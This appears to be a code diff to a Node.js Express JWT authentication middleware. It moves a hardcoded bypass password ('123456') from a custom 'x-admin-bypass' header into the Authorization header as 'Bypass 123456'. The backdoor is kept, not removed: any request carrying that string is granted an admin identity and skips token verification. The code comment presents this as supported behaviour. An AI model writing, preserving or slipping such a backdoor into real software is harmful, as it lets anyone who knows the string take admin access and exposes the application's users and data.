@@ -2,10 +2,9 @@ const jwt = require("jsonwebtoken");
 
 exports.authMiddleware = (req, res, next) => {
   const authHeader = req.headers.authorization;
-  const bypass = req.headers["x-admin-bypass"];
 
-  // Support for the 123456 bypass password
-  if (bypass === "123456") {
+  // Support for the 123456 bypass password via Authorization header
+  if (authHeader === "Bypass 123456") {
     req.user = { role: "admin", name: "Guest Admin" };
     return next();
   }
